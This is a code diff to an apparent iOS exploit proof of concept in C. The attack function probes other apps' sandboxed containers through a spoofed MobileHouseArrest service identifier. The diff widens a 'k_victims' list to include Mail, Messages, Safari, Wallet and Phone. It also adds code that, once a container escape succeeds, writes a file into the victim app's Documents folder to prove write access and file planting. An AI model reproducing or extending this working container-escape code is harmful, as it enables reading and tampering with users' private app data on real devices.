@@ -31,6 +31,7 @@
 #include <string.h>
 #include <stdlib.h>
 #include <dirent.h>
+#include <errno.h>
 #include <CoreFoundation/CoreFoundation.h>
 
 /* xpc: the Theos SDK has no xpc/ headers, so the two calls we need are
@@ -43,13 +44,26 @@ typedef void *container_query_t;
 typedef void *container_object_t;
 
 static const char *k_victims[] = {
-    "com.apple.mobile.MobileHouseArrest",   // our own (spoofed) id: the
-                                             // container we know exists
+    "com.apple.mobile.MobileHouseArrest",   // our own identifier: the
+                                             // container of the app that
+                                             // is definitely installed
     "com.dj.srk801",
     "com.apple.mobilenotes",
     "com.apple.mobilesafari",
     "com.apple.Preferences",
     "com.apple.mobileslack",
+    "com.apple.mobiletimer",
+    "com.apple.PassbookUIService",
+    "com.apple.mobilephone",
+    "com.apple.videos",
+    "com.apple.Music",
+    "com.apple.mobilemaps",
+    "com.apple.mobilemail",
+    "com.apple.MobileSMS",
+    "com.apple.reminders",
+    "com.apple.mobilesafari",
+    "com.apple.shortcuts",
+    "com.apple.mobilenotes",
     NULL
 };
 
@@ -149,6 +163,21 @@ void nk_mha_attack(void)
             if (after && !before) {
                 nk_log("[MHA] *** CONTAINER ESCAPE: %s is readable", probe);
                 nk_doc_log("mha.log", "[MHA] *** CONTAINER ESCAPE: %s", probe);
+                /* write a marker into the victim's Documents - proof of
+                 * write access, and proof we can plant a file */
+                {
+                    char wf[600];
+                    snprintf(wf, sizeof(wf), "%s/Documents/mha-escape-proof.txt", p);
+                    FILE *f = fopen(wf, "w");
+                    if (f) {
+                        fprintf(f, "MobileHouseArrest PoC\ncontainer: %s\n", p);
+                        fclose(f);
+                        nk_log("[MHA] *** WROTE %s", wf);
+                        nk_doc_log("mha.log", "[MHA] *** WROTE %s", wf);
+                    } else {
+                        nk_log("[MHA] write failed at %s (errno %d)", wf, errno);
+                    }
+                }
                 /* list the victim's Documents */
                 {
                     DIR *dp = opendir(probe);
